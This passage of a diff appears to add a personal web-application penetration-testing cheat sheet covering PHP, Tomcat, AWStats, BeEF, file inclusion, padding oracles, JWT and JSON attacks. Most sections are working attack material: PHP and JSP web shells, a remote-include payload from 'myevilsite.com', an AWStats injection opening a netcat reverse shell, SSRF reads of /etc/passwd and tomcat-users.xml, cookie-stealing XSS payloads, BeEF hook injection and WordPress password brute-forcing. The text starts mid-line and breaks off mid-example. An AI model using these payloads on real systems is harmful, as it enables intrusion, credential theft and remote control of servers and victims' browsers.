+			curl_setopt($ch, CURLOPT_POSTFIELDS, "name="Matt&pass=coolB3ans");
+			$resp = curl_exec ($ch);
+			curl_close ($ch);
+		   ?>
+
+	
+		PHP Code for mysql query:
+		     First Connect:	
+			$db = mysql_connect("localhost", "kevin", "mypasswd");
+		     Select the DB:
+			mysql_select_db("zombies", $db);
+		     Then execute the query:
+			mysql_query($sql);
+
+
+		Sample php page for basic web shell:
+			<?php
+			   system($_GET["cmd"]);
+			?>
+			access it by going to http://site.com/shell.php?cmd=uname
+
+
+
+
+PHPinfo()
+	if phpinfo() works try this in it's place:
+	system('cat%20/etc/passwd')
+		system() allows execution of commands on older version of PHP
+
+	http://www.site.com?user=jimmy'.phpinfo().'
+	http://www.site.com?user=jimmy'.system('cat%20/etc/passwd').'
+
+	http://www.site.com?user=jimmy$(uname -a)
+		if blind use sleep:
+
+	http://www.site.com?user=jimmy$(sleep 20)
+
+	http://victimsite.copm/?page=http://myevilsite.com/test_include_system.txt%00&c=uname
+		contents of test_include_system.txt file:
+			<?php 
+  			   system($_GET['c']);
+			?>
+		note the GET 'c' directive. is defined in the URL and executes whatever command is listed
+		also note the %00 which drops the file extenstion. The original parameter was:
+			page=intro
+				the application adds the .php to it. %00 drops the .php 
+
+
+PHP session file:
+	/var/lib/php5/sess_[session ID/cookie]
+	
+	login to php page with: ted<?php phpinfo(); ?>
+	if username stays populated with the above login you know it is stored
+	now goto:
+		http://site.com/blog.php?page=/var/lib/php5/sess_[session ID]
+	phpinfo page should be displayed
+
+
+PHP on Windows:
+	< translates to *
+	All files uploaded in php are temp stored in C:\windows\temp\php??.tmp
+	so you can do this:
+		fileview.php?loc=C:\Windows\Temp\php<.tmp
+			shows files uploaded in php
+
+		
+
+BeEF		Browser Framework for building attacks.
+		http://www.bindshell.net/
+		Zombie Control	
+		beefmagic.js.php file is the file that will allow you to make a 
+			visiting computer the zombie
+			Add the following to an existing web page:
+				<script language='Javascript' src='/beef/hook/beefmagic.js.php'></script> 	
+		Modules available:
+			Autorun - alert box or deface content on a page
+			Clipboard Stealing - IE 7 or older
+			JavaScript Injection - running of further code 
+			Request Initiation - CSRF attacks!
+			History Browsing - Retrieves browser history
+			Port Scanning - Port scanning
+			Browser Exploits - runs calc.exe on victim machine
+			Inter-Protocol Exploitation - Submits malicious payloads
+				inject a BindShell, etc
+
+		BeEF	->
+		Uses hook.js to hook the browser
+			<script src=http://beefserver:3000/hook.js></script>
+		Injection this script via XSS
+		./beef
+		http://192.168.1.8:3000/ui/panel
+			user: beef pw: beef
+
+		Admin Port 3000
+		Hook capabilities: hook.js
+		Proxy Server Port 6789
+			used for enabling proxying through a victim browser
+			THis enables us to configure our browswer to use the BeEF 
+			server as its proxy server.  The requests will then be sent
+			through the victim.
+	
+		Modules status based on hooked victims user agent:
+		Green 	Works on the victim
+		Orange	Works but may be visible
+		White	Not confirmed to work
+		Red	Doesn't Work
+
+		Ettercap filter to inject the BeEF hook into HTTP traffic
+		    if (ip.proto == TCP && tcp.src == 80) {
+		    replace("</body>", "<script src='http://mysite.com/hook.js'>
+		    </script></body>");
+		    replace("Accept-Encoding: gzip, deflate",
+		    "Accept-Encoding:              ");
+		    }
+
+		BeEF includes web-cloning functionality within the social engineering 
+			extension.  The framework injects its JavaScript hook into the 
+			cloned web content by default.  To leverage this functionality,
+			start BeEF by running ./BeEF and execute the following in a 
+			different terminal to interact with BeEF’s RESTful API.
+				 curl -H "Content-Type: application/json; charset=UTF-8" -d '{"url”:”<URL of site to clone>”,”mount”:”<where “to mount>}’ -X POST http://<beefURL>:3000/api/seng/clone_page?token=bla
+
+				
+	
+		Metasploit Integration
+			Metasploit needs to be reachable from the victim
+	
+		XSSRays - a XSS site scanner delivered via the hooked browser
+
+
+
+'Web Application Obfusification' book -> look for it in safari
+
+GWTEnum -> tool will parse google web toolkit libraries
+	shows what functions are exposed via API
+	http://www.gdssecurity.com
+
+
+Generating Data URIs:
+	www.scalora.org/projects/uriencoder/
+	software.kixie.ch/utilities/cgi/data/data
+
+	datauri-generator.py
+
+	base64 encode <script>alert(1)</script>
+	site.org/index.php?lang=<object data="data:text/html;base64,<encoded data>"></object>
+	<hr onload="alert(1)">
+	<img src="broken" onerror="alert(document.cookie)">
+	<!--><img src="broken" onerror="alert(document.cookie)">-->
+
+
+Web Services:
+	ReST	Representational State Transfer
+		uses HTTP methods, employees alternamte HTTP methods
+		isn't very different from normal web traffic
+		can use normal testing procedures on them
+		less complex and less overhead
+	SOAP	Simple Object Access Protocol
+		SOAPUI - soapui is a test framework
+		Proxy SOAPUI to burp, then have burp do a scan
+		
+	WSDL	Web Services Description Language
+		describes the functionality offered by a web server
+		the location of the service
+		how to invoke the service
+		XML based
+		We can manually browse to the WSDL during testing	
+	
+	Specific Attacks:
+		XPath Injection
+		External Entity Attack
+
+	Ken Johnson -> cktricky -> extending testing on web services for soap
+			Burp extention 
+	
+
+
+	
+UDDI -> Universal Description, Definition, Integration Specification 
+	core part of Web Services
+	Designed to be queried by SOAP to point users to the WSDL file
+	Phonebook of web services
+	Public UDDI directories:
+		uddi.microsoft.com
+		uddi.ibm.com
+	
+		
+WSFuzzer -> fuzz soap based web services -
+	https://www.owasp.org/index.php/WSFuzzer
+	./WSFuzzer.py -w http:/site.org/site?wsdl
+	
+
+
+
+******************************************************************************************
+Encryption Section
+******************************************************************************************
+
+openssl		Use Openssl to talk to ssl ports and gather information
+   openssl
+	OpenSSL> s_client -connect www.mysite.com:443
+	HEAD / HTTP/1.0
+
+   openssl s_client -connect 1.1.1.1:443 -ssl2	
+	#tests to see if the webserver supports ssl version 2
+		you should only allow TLSv1.x on websites	
+	openssl s_client -cipher enull -connect 1.1.1.1:443
+	#This sends an SSL Hello claiming SSLv2 and v3 with only the 
+		set of null ciphers available.
+	openssl s_client -connect www.site.org:443 -ssl2
+	openssl s_client -connect www.site.org:443 -cipher NULL
+
+	Testing SSL Renegotiating:
+		openssl s_client -connect www.site.org:443
+			GET / HTTP/1.1		#once inside OpenSSL do a Get
+			R			# R tells OpenSSL to attempt renegotiation
+
+		echo R | openssl s_client -connect <Target HOST>:443 |grep DONE
+
+SSLScan		-Shows all supported ciphers and ssl version
+		./sslscan --no-failed www.mysite.com
+
+nmap script	use script to test ciphers
+		nmap --script ssl-cert,ssl-enum-ciphers,ssl2 -p 443 www.site.com
+			sslv2, ssl-poodle, ssl-heartbleed, ssl-ccs-injection
+
+sslyze		test ciphers, renegotiation and heartbleed
+		python ./sslyze.py --regular --reneg <Target Host>
+
+testssl.sh	test ciphers, renegotiation, heartbleed, BREACH, etc.
+		https://github.com/drwetter/testssl.sh
+		testssl.sh www.site.com
+
+THC SSL Check	-Shows all supported ciphers and ssl versions
+		wine THCSSLcheck.exe www.site.org 443
+
+SSLDigger	-Grades SSL ciphers and strengths
+
+
+Cipher names decoded:
+	This cipher suite name is DHE-RSA-AES256-SHA. It is for SSL version 3, the key exchange 
+	algorithm (Kx) is DH, the authentication algorithm (Au) is RSA, the encryption algorithm 
+	(Enc) is AES(256), the message authentication code algorithm (Mac) is SHA1.
+
+	Kx (key exchange) and Au (authentication) are performed only during the establishing 
+	connection and are therefore not relevant for performance.
+
+	Enc (encryption algorithm) and Mac (message authentication code algorithm) are used to 
+	encrypt/decrypt the data stream and have direct impact on performance.
+
+	Now we must choose a cipher suite with the fastest Enc and Mac ciphers. Lets write down all 
+	Enc and Mac algorithms listed in the table:
+
+	Enc: AES(256), 3DES(168), AES(128), RC2(128), RC4(128). I intentionally skipped the ciphers 
+	with key length less than 128 bit (DES(56), RC2(40), etc.); they cannot be considered secure 
+	nowadays.
+
+	Mac: SHA1, MD5.
+
+
+http://www.willhackforsushi.com/code/ecb_encrypt_image.zip
+	will encrypt image with AES-ECB and show randomness or lack of
+
+1f8b hex header for gzip format
+
+ent	attempts to determine entrophy (randomness)
+		bigger number is better
+	ent file1.bin |grep Entrophy
+
+HashCalc	-> Computes hash for text string, hex string or file 
+		   free tool from SlavaSoft
+
+
+IV is typically first half of session -> use bit flipping attack here
+Ciphertext is typicaly the second half
+
+padbuster ->exploit tool for padding oracle vulnerabilities by Brian Holyfield
+	perl padbuster.pl "http://site.com/captcha.php?enc=<key> <key> 8 -encoding 1
+		key can be in DATA or COOKIE as well
+
+	 padbuster "https://site.com/info" bed48534cc982c989c9471417a8fa1c9 8 -encoding 1 -cookies "hq_session=bed48534cc982c989c9471417a8fa1c9" -bruteforce
+
+
+	Padbuster gives 500 unable to connect errors on a website with an invalid ssl cert. Add 
+		$ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0; 
+	to the request method to fix.
+	do {
+	   #Quick hack to avoid hostname in URL when using a proxy with SSL (this will get re-set later if needed)
+	   $ENV{HTTPS_PROXY} = "";
+	+  $ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0;
+   
+	   $lwp = LWP::UserAgent->new(env_proxy => 1,
+        	keep_alive => 1,
+	
+	To graffeti a captcha:
+	perl padbuster.pl "http://site.com/captcha.php?enc=<key> <key> 8 -encoding 1 -plaintext PWNED	
+		-plaintext PWNED	->encrypts text with broken oracle
+
+
+******************************************************************************************
+Application Specific Section
+******************************************************************************************
+
+WPScan 		-Wordpress Security Scanner
+		 http://code.google.com/p/wpscan/
+		 Install:
+			apt-get install libcurl4-gnutls-dev
+			gem install --user-install mime-types typhus xml-simple
+			svn checkout http://wpscan.googlecode.com/svn/trunk/ ./wpscan 
+			
+		Execute:
+			cd wpscan/trunk
+			./wpscan.rb --url globosferro.org --enumerate p
+		Brute force admin password:
+			./wpscan.rb --url http://site.org/ --wordlist ./list.txt --username Admin
+
+		-Do wordlist password brute force on enumerated users using 50 threads ...
+			ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50
+
+		-Do wordlist password brute force on the 'admin' username only ...
+			ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin
+
+		-Enumerate installed plugins ...		
+			ruby ./wpscan.rb --url www.example.com --enumerate p
+
+		-Enumerate installed themes ...
+			ruby ./wpscan.rb --url www.example.com --enumerate t
+
+		-Enumerate users ...
+			ruby ./wpscan.rb --url www.example.com --enumerate u
+
+		-Enumerate installed timthumbs ...
+			ruby ./wpscan.rb --url www.example.com --enumerate tt
+
+		-Use a HTTP proxy ...
+			ruby ./wpscan.rb --url www.example.com --proxy 127.0.0.1:8118
+
+		-Use a SOCKS5 proxy ... (cURL >= v7.21.7 needed)
+			ruby ./wpscan.rb --url www.example.com --proxy socks5://127.0.0.1:9000
+
+		-Use custom content directory ...
+			ruby ./wpscan.rb -u www.example.com --wp-content-dir custom-content
+
+		-Use custom plugins directory ...
+		ruby ./wpscan.rb -u www.example.com --wp-plugins-dir wp-content/custom-plugins
+
+		-Update ...
+			ruby ./wpscan.rb --update
+
+
+
+
+
+Sharepoint:
+	ShareDiggity -> Sharepoint recon tool from Stach and Liu
+
+
+
+AWSTATS
+	Google - inurl:awstats
+		 intitle:"statistics for"
+	Try appending the following to the URL:
+		?&PluginMode=:print+system(`id')+;
+			or
+		?&PluginMode=:print+systme('top -b -n1')+;
+			or
+		have a nc listener running "nc -l -p 3000"
+		?&PluginMode=:print+system('nc+<ip of nc>+3000+-e+/bin/sh')+;
+			run ls -l in nc listener
+
+
+Blind Elephant
+	./BlindElephant.py -l
+		List supported apps and plugins
+	./BlindElephant.py http://site.org/app guess
+		guess installed apps
+
+
+AXIS2 with Tomcat
+	AXIS2 by default located at www.site.com/axis2
+
+	Go to www.site.com/axis2/services/listServices to see running services
+
+	The WSDL information can be accessed by clicking the service's name in the 
+	listServices page:
+		http://www.site.com/axis2/services/ProxyService?wsdl
+
+		In this file we can see that only one operation is defined (get):
+			<wsdl:operation name="get">
+			 <wsdl:part name="parameters" element="ns:get"/>
+		This operation is usually defined multiple times in the file for each
+		different way to access it.
+			You can see the get operation uses a tns:getRequest and sends
+			back a tbs:getResponse.  We are most interested in what we need
+			to send to the service
+
+		This value declared above in the WSDL file as a parameter(get) named 
+		uri and that this parameter is a string:
+			<xs:element minOccurs="0" name="uri" nillable="true" type="xs:string"/>
+
+		Gathering this information is mostly a guess work and will depend on the 
+		WSDL file created by a given framework/tool, however we now have 
+		everything we need to call the Web service.
+
+	Now the good stuff!!  
+		Call a Web Service:
+		http://www.site.com/axis2/services/ProxyService/get?uri=http://evil.com
+
+		Use as a Port Scanner:
+		http://www.site.com/axis2/services/ProxyService/get?uri=http://localhost:22/
+			this will return what version of OpenSSH is used
+
+		Classes used to fetch and retrieve content:
+			http://
+			https://
+			ftp://
+			file://
+			…
+
+			http://www.site.com/axis2/services/ProxyService/get?uri=file:///etc/passwd
+
+
+	Tomcat Manager
+		usually accessed through http://site.com/manager/html
+
+		sometimes this can be accessed by double encoding the url:
+			http://site.com/examples/jsp/%252e%252e/%252e%252e/manager/html	
+				same as: http://site.com/examples/jsp/../../manager/html
+					the % is encoded to %25, the 2e is the %2e for .
+
+
+		The file containing the login and password is named tomcat-users.xml and
+			is stored in $CATALINA_HOME/conf/  or /etc/tomcat6/ on most systems
+				
+			It looks like this:
+			<tomcat-users>			 <role rolename="manager-gui"/>			 <user username="tomcat" password="tomcat" roles="tomcat"/> 
+			 <user username="admin" password="s3cret" roles="manager-gui"/>
+			</tomcat-users>
+
+		Do this to see the contents of that file:
+			http://www.site.com/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml
+
+		Common Tomcat logins and Passwords:
+			Username	Password			tomcat 		tomcat 
+			admin
+			admin 		manager 
+			admin 		password 
+			admin 		s3cret
+
+		Now we can write a .jsp web shell, convert to .war and upload it through 
+		Tomcat manager:
+			
+		   Create a dir called webshell.  
+		   Create a file called webshell/index.jsp with the following content:
+			<FORM METHOD=GET ACTION='index.jsp'> 
+			<INPUT name='cmd' type=text>			<INPUT type=submit value='Run'> 
+			</FORM>			<%@ page import="java.io.*" %> 
+			<%			 String cmd = request.getParameter("cmd"); 
+			 String output = "";			 if(cmd != null) {			   String s = null; 
+			   try {			     Process p = Runtime.getRuntime().exec(cmd,null,null);
+			     BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+			     while((s = sI.readLine()) != null) { output += s+"</br>"; } 
+			   } catch(IOException e) { e.printStackTrace(); }			 } 
+			%>			<pre><%=output %></pre>
+		
+		   Now create a .war file:
+			cd webshell
+			jar -cvf ../webshell.war *
+			upload .war file via Tomcat Manager
+
+
+clusterd
+	clusterd -i www.site.com -p 443 -a coldfusion -v 10 --cf-hash
+		attempts to perform a "hash retrieval" from coldfusion version 10 
+		attack supposedly works on version 6 - 10
+	clusterd -i www.site.com -a cold fusion --deployer lfi_stager --deploy /usr/share/clusterd/src/lib/resources/cmd.cfml
+		attempts to deploy shell cmd.cfml to cold fusion site. Access shell by going to:
+			www.site.com/cmd.cfml
+
+
+******************************************************************************************
+Browser Plugins Section
+******************************************************************************************
+Auto Reload Tab		Firefox plugin that will automatically reload a tab in your browser
+			helps keep your session alive.
+			https://gitlab.com/alanramsey/auto-reload-tab
+
+Live HTTP Headers	Plugin for Mozilla-based browsers that allows you to examine the last
+		request submitted in your browser...and then modify/replay it
+		http://livehttpheaders.mozdev.org/installation.html
+
+Firefox Extensions:
+	Firebug		-Great for Hidden Fields, Breckinf forms, Messing with Java Script
+	YSlow		-Requires Firebug - gives you time and breakdown of components
+	TestGen4Web	-Allows record and playback, modify recordings, etc
+
+
+Plugins for discovering XSS:
+	TamperData	Plugin for Firefox, plus allows you to mangle
+			packets
+	XSS Me		Plugin for firefox, form input testing much like
+			SQL Inject Me
+	GreaseMoneky	Plugin for Firefox
+	
+Plugins for discovering SQLi
+	TamperData -> firefox plugin for SQL injection and/or XSS discovery
+
+	SQL Inject Me -> firefox extension against forms
+		released by Security Compass
+
+
+
+******************************************************************************************
+Flash Section
+******************************************************************************************
+
+RatProxy	is a mostly passive scanner
+		Will decompile flash objects
+		http://code.google.com/p/ratproxy
+		./ratproxy -w ratproxy.log -v /output/ -d site.org -xtfscgX
+		./ratproxy-report.sh ratproxy.log > ratproxy.html
+			view ratproxy.html in browser
+
+Flare		is a Flash Decomiler allowing you to see the source code for a
+		flash app.
+		./flare video.swf	#usually kicks out some errors but works
+		vi video.flr
+
+
+Ratproxy	->passive scanner
+		http://code.google.com/p/ratproxy
+		Will decompile flash objects
+		./ratproxy -w rat.log -v rat -d www.site.org -xtfscgjX
+		./ratproxy-report.sh rat.log > rat.html
+			-w write rat.log
+			-v use directory rat
+			-d specified domain only (default is all)
+			-x log all XSS candidates
+			-t log all directory traversal candidates
+			-f log all Flash applications for analysis
+			-s log all POST requests for analysis
+			-c log all cookie setting URLs for analysis
+			-g perform XSRF token checks on all GET requests
+			-j report on risky Javascript constructions
+			-X disruptively validate XSRF, XSS protections
+			-P use upstream proxy (-P host:port)
+
+crossdomain.xml	-> XML file placed in web root to control who can connect to
+			 you via flash.  It does allow wildcard *
+				*.site.org will match:
+					www.site.org
+					site.org
+					dev.site.org
+	
+	Site-control	->this policy sets the control for the domain. multiple options
+			none		-> no policy files are allowed
+			master-only	-> only the file in the root is read
+			by-content-type	-> uses the Content-Type header set to 
+				text/x-cross-domain-policy
+			by-ftp-filename	-> only crossdomain.xml files are allowed
+			all		-> all files are allowed
+
+Flare		->flash decompiler for action script v2.  v3 is current version
+		./flare file.swf
+
+HP SWFScan	->windows app that evaluates SWF files for vulnerabilities
+		supports both ActionScript v2 and v3
+		lets us see source code and look for vulnerabilities
+
+SWF Investigator	-> from Adobe.  New tool.  Better then Flare
+
+SWFIntruder		-> Will show areas to test for XSS 
+			Tons of false positives.  Just gives a place to start looking
+
+SWFIntruder	Tool for analysis of Flash files - Better than Flare - it is
+		designed for security testing.  Shows injectable fields
+
+
+
+******************************************************************************************
+Java Section
+******************************************************************************************
+
+JAD		Java decompiler - convert class files back into source code.
+		View Page Source and find where the HTML calls the .class file
+			and download it with wget, etc.
+		./jad -v MyAddress.class
+			the -v tells it to list the method names as it decompiles
+			Load each .jad file in a text editor.  Review for items such
+				as HTTP calls or network functions
+
+JD-GUI		Great Java decompiler for Mac
+		http://java.decompiler.free.fr/?q=jdgui
+
+
+Java Applets (client side)	-> Uses JRE
+	The 'APPLET' tag is deprecated.  But is still used A LOT!
+	Grab the Class Files and the Web page, put them in a directory
+	SCRIPTABLE and MAYSCRIPT configure the applet
+		MAYSCRIPT	->allows communication from applets to JavaScript
+		SCRIPTABLE	->allows JavaScript to interact with applets, IE only
+
+	Class Files	->This is the JAVA after it has been compiled.  Runs in the
+			JVM.  These are the files loaded to run the applet
+
+
+Installing Burp Cert into JRE
+	If you're testing web apps that use Java applets
+	Sometimes applets communicates through HTTPS, so even if you change the JNLP file (if they use JNLP)
+	To use HTTP instead of HTTPS, depending on the logic implemented in the applet 
+
+	Proxying the applet's HTTPS traffic through Burp isn't straightforward.
+
+	Either the applet doesn't load, or you don't see HTTPS traffic.
+
+	The solution is adding Burp CA cert to the JRE cacert keystone used by the Java plugin in your browser. 
+
+	Most of the times you need to run applets on IE (not sure why :-), so the following is a quick guide to add the Burp CA
+	To the JRE cacert keystore. Just tested it on Win7/IE10, works as a charm:
+
+	1. Proxy a browser to Burp, then go to http://burp (latest version).
+
+	2. Download burp CA cert (the file will be cacert.der)
+	
+	3. start a CMD as admin (ctrl+shift+enter if you're on windows 7)
+
+	4. verify which version of java you're using as the browser plugin (1.6 or 1.7) and find the relative directory where it's installed.
+	You'll find a JRE directory as the following:
+	C:\Program Files (x86)\Java\jre7\lib\security\cacerts
+
+	5. Run this command:
+	C:\Users\morru>keytool -importcert -v -file "C:\Users\morru\Downloads\cacert.der" -alias burpca -keystore "C:\Program Files (x86)\Java\jre7\lib\security\cacerts"
+
+	6. When prompted for password, use: changeit (and reply to "Trust this certificate?" with: yes)
+
+	7. Delete IE cache, proxy globally through Burp.
+	The applet loading is a bit slower (using Java 1.7). Make sure to allow/accept all those 
+	applet warnings if you're playing with a self-signed java applet. Give the browser/applet the time to fully load.
+
+	8. Enjoy proxying HTTPS traffic from the applet with Burp. You will see requests with the User Agent request header similar to:
+	User-Agent: Mozilla/4.0 (Windows 7 6.1) Java/1.7.0_17
+
+
+
+JavaSnoop	https://code.google.com/p/javasnoop/
+	Can attach to existing Java process and manipulate
+
+
+******************************************************************************************
+.NET Sections
+******************************************************************************************
+
+JustDecompile	.NET decompiler for Windows 
+		http://www.telerik.com/download-trial-file.aspx?pid=845
+
+CAT.NET -> Free .NET static analysis tool
+
+FxCop -> Free .NET static analysis tool
+
+
+******************************************************************************************
+AJAX Sections
+******************************************************************************************
+AJAX Discovery:
+	Sprajax
+	Ratproxy
+
+sprAJAX -> Spiders AJAX applications
+	Limited to Microsoft AJAX frameworks
+	Can remove the check for Microsoft so that it can scan other frameworks
+
+
+******************************************************************************************
+CRSF Section
+******************************************************************************************
+MonkeyFist -> automate XSRF exploitation
+		http://hexsec.com/labs
+
+
+******************************************************************************************
+File Include Section
+******************************************************************************************
+
+http://site.org/example.php?page=../../../../../../../../../../../etc/passwd%00
+	notice the null byte (%00) placed after the attack string and before the argument
+	this drops any suffix/file extension automatically added by the server
+
+
+Local File Include:
+Use PHP to grab other php files for source code disclosure -> must prevent
+	PHP execution to do this.  Otherwise PHP will render content.
+	Encode to Base64, then display:
+		php://filter/read=convert.base64-encode/resource=filename
+			Base64 encoded data can't be rendered.
+		http://site.com/fileview.php?loc=/etc/passwd
+		http://site.com/fileview.php?loc=/php://filter/read=convert...
+
+
+Remote File Include:
+http://site.com/blog.php?page=http://127.0.0.1/blog.php
+	if site shows up twice you are vulnerable to RFI
+If a firewall blocks your RFI that actually calls a remote file:
+	http://atacker:53/shell.txt
+
+	<?php system('ls'); ?>    -> base64 encode this
+
+	Create a local file with:
+	<form action="http://site.com/fileview.php?loc=php://input method="post" enctype="text/plain">
+	<input type="text" name="exploit" value="<?php phpinfo(); ?>" />
+	</form>
+
+	/fileview.aspx?loc=\\attacker\mal\mal.txt
+
+
+File Inclusion and Code Execution Across Languages:
+	PHP 		require() and include()
+				code execution
+			eval()		-> when you see this in an error message code 
+					   execution is possible.  Try ' and " for leading
+					   character
+					   ".system('uname -a'); $dummy=".
+						or
+					   ".system('uname -a');# 
+					   '.system('uname -a')%3b%23
+						or 
+					   ".system('uname - a');//.
+					   ".system('uname - a')%3b//.
+						May need to URL encode # and ; symbols
+						# and // are comments
+			usort()		-> when you see this in an error message code
+					   execution is possible
+			phpinfo()	-> should be able to use the system function to 
+					   run commands
+						'.phpinfo().'
+
+
+	ASP(.NET)	Response.WriteFile()
+			no code execution
+	ASP(.NET)	Server.Execute()
+			code execution, web root access only
+	JSP		<jsp:include page="" />
+			code executino, web root access only
+
+	SQL Request
+			order by
+			We know that we need to close the statement with } and comment out 
+			the rest of the code using // or # (with encoding). We can try 
+			poking around with:				?ordernum=id;}//: we get an error message 
+					(Parse error: syntax error, unexpected ';'). 
+			We are probably missing one or more brackets.				?order=id);}//: 
+			we get a warning. 				?order=id));}//: 
+			we get an error message 
+				(Parse error: syntax error, unexpected ')' i). 
+			We probably have too many closing brackets.			Since we now know how to finish the code correctly (a warning 
+			does not stop the execution flow), we can inject arbitrary code 
+			and gain code execution using 
+				?order=id);}system('uname%20-a');// for example.	
+
+
+
+******************************************************************************************
+JavaScript JWT (JSON Web Tokens) Section
+******************************************************************************************
+Copy Authorization: Bearer header value or "token" cookie value and paste into:
+	https://jwt.io
+
+In the Decoded Header section change the "alg" value to "none"
+change the "email" address to something made up that doesn't exist in app.
+Remove the "signature" section which is the part AFTER the 2nd period
+
+Copy Encoded value back into request in burp and see if it works.
+
+
+Burp Extension: JSON Web Tokens -> will highlight JWT in proxy history and decode them 
+
+
+
+JWT Tool - is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens).
+https://github.com/ticarpi/jwt_tool
+
+
+
+
+
+******************************************************************************************
+JSON Section
+******************************************************************************************
+JSON -
+JavaScript Object Notation (JSON) is a language and platform independent format for data 
+interchange. JSON is in widespread use with a number of JSON parsers and libraries available 
+for different languages. While some information is available for JSON hijacking this attack is 
+not very well understood.
+
+JSON Hijacking as the name suggests is an attack similar to Cross-Site Request Forgery where an
+attacker can access cross-domain sensitive JSON data from applications that return sensitive 
+data as array literals to GET requests. An example of a JSON call returning an array literal is
+shown below:
+
+ [{"id":"1001","ccnum":"4111111111111111","balance":"2345.15"},{"id":"1002","ccnum":"5555555555554444","balance":"10345.00"},{"id":"1003","ccnum":"5105105105105100","balance":"6250.50"}]
+
+This attack can be achieved in 3 major steps:
+
+Step 1: Get an authenticated user to visit a malicious page.
+
+Step 2: The malicious page will try and access sensitive data from the application that the 
+	user is logged into. This can be done by embedding a script tag in an HTML page since 
+	the same-origin policy does not apply to script tags. 
+	<script src="http://<json site>/json_server.php"></script>
+
+	The browser will make a GET request to json_server.php and any authentication cookies 
+	of the user will be sent along with the request.
+
+Step 3: At this point while the malicious site has executed the script it does not have access 
+	to any sensitive data. Getting access to the data can be achieved by using an object 
+	prototype setter. In the code below an object prototypes property is being bound to the 
+	defined function when an attempt is being made to set the “ccnum” property.
+
+	Object.prototype.__defineSetter__('ccnum',function(obj){
+		secrets = secrets.concat(" ", obj); 
+	});
+
+	At this point the malicious site has successfully hijacked the sensitive financial data 
+	(ccnum) returned by json_server.php
+ 
+
+It should be noted that not all browsers support this method; the proof of concept was done on 
+Firefox 3.x. This method has now been deprecated and replaced by the use Object.defineProperty 
+There is also a variation of this attack that should work on all browsers where full named 
+JavaScript (e.g. pi=3.14159) is returned instead of a JSON array.
+
+There are several ways in which JSON Hijacking can be prevented:
+
+Since SCRIPT tags can only generate HTTP GET requests, only return JSON objects to POST 
+requests.
+
+Prevent the web browser from interpreting the JSON object as valid JavaScript code.
+
+Implement Cross-Site Request Forgery protection by requiring that a predefined random value be 
+required for all JSON requests.
+
+
+
+*****
+
+
+If we send the word "CANARY" into each input, we can see if that input ends up in the 
+response generically (great for cross site scripting) or specifically in the JSON (which 
+means we might be able to perform JSON injection). 
+
+On this page, the value sent in one particular parameter "ToolID" seems to show up in the 
+response JSON. This is potentially good (or potentially bad if your the developer). Lets 
+inject ToolID and looks at the resulting JSON.
+
+Get the response using your favorite method and search for your input ("Canary" in this 
+example). Here is a greatly truncated example response.
+
+	try{ 
+		var gPenTestToolsJSON = ( 
+			{"query": { 
+				"toolIDRequested": "CANARY", 
+				"penTestTools": []}} ); 
+		}catch(e){ 
+			alert("Error trying to evaluate JSON: " + e.message); 
+		};
+
+Note the developer outputs the value of the "ToolID" parameter into the JSON. If the 
+developer encodes the output as a JavaScript string, this is ok. The OWASP ESAPI includes 
+a method "encodeForJavaScript()" which performs this encoding.
+
+Did the developer encode the output? We will check to find out. If the developer did not 
+encode, chances are the JSON is vulnerable. (What if the developer used input validation? 
+In that case, try to use SQL injection to inject the payload into the database table from 
+which the data is fetched. Output encoding will protect the site even if the database is 
+infected by a worm, SQLi, or a rouge DBA.
+
+To check for encoding, send it characters which most certainly should be encoded. This 
+would be any characters that are not alphanumeric. This example will use the string 
+"{\'"CANARY"\'}" so we can test a few useful characters in one test (single-quotes, 
+double-quotes, parenthesis are all handy). Here is the response. We note that the site has 
+a defect as the characters are not output encoded. Again this is just a fraction of the 
+response.
+
+	try{ 
+		var gPenTestToolsJSON = ( 
+			{"query": { 
+			"toolIDRequested": "{\'"CANARY"\'}", 
+			"penTestTools": []}} ); 
+	}catch(e){
+		 alert("Error trying to evaluate JSON: " + e.message); 
+	};
+
+As usual, pen-testing is a lot of mapping and discovery research followed by a short 
+exploit. So far we found the inputs into the page, figured out which input is output into 
+the JSON, figured out where in the JSON the output lands, and figured out the output is 
+not properly encoded due to a defect.
+
+Web pages offer choices because there is more than one interpreter listening. There is 
+obviously an HTML interpreter and perhaps slightly less obvious there is a JavaScript 
+interpreter listening. We could also choose to poison the existing JSON context rather 
+than break-out into HTML or JavaScript. Perhaps we could poison the JSON with false values 
+of our choosing. Lets choose to break-out into JavaScript and execute some JavaScript code 
+of our choosing as an example.
+
+This requires determining how to "escape" the current context so we can start a new 
+command. The context is JSON. We want to break-out or escape the JSON and execute some 
+JavaScript. We need to look where our canary landed carefully so we can end the current 
+JSON statement and start a new JavaScript code statement. We need to insert characters to 
+end the JSON by completing the JSON with the characters that would naturally end the JSON. 
+Work backwards from the canary and notate each character that "opened". We have a double-
+quote that quotes our canary, before that an open curly-brace after "query", another open 
+curly-brace before "query", and that opening parenthesis. 
+
+	try{ 
+		var gPenTestToolsJSON = ( 
+			{"query": 
+				{ "toolIDRequested": "
+
+To break out of the JSON context, we just insert those characters counterparts to "close-
+out" those opening characters. When injecting JavaScript it is a good idea to also add a 
+semicolon to our "close-out" because valid JavaScript statements end in semi-colons. To 
+deal with all the JSON that comes after our canary, we will insert a comment to comment 
+all that ending JSON out. Between our "close-out" characters and our ending comment goes 
+our payload. We chose JavaScript so our payload will be a well-formed JavaScript 
+statement.
+
+Be careful. It is important to end the statement exactly as it started. Watch out for 
+spaces that matter and be certain the order of the characters injected complements the 
+characters being closed-out. Assuming a simple alert statement is our payload, lets match 
+each character one-by-one. The double-quote, first curly-brace, second curly-brace, 
+closing parenthesis, then a semi-colon terminate the JSON. We inject our payload next, 
+then a comment to comment-out what would have become the rest of the JSON. NOTE: We URL 
+encode certain characters (i.e. semi-colons) because they could break the web server 
+otherwise making the web-server return a 500 error.
+
+	try{ 
+		var gPenTestToolsJSON = ( 
+			{"query": { 
+				"toolIDRequested": ""}} )%3balert(1)%3b//
+
+All together the injection looks like this example. Inject this exploit instead of the word "canary".
+
+	"}} )%3balert(1)%3b//
+
+Using Burp capture or View Source, view the response. Also note the popup in your browser. The JavaScript injection is complete.
+
+	try{ 
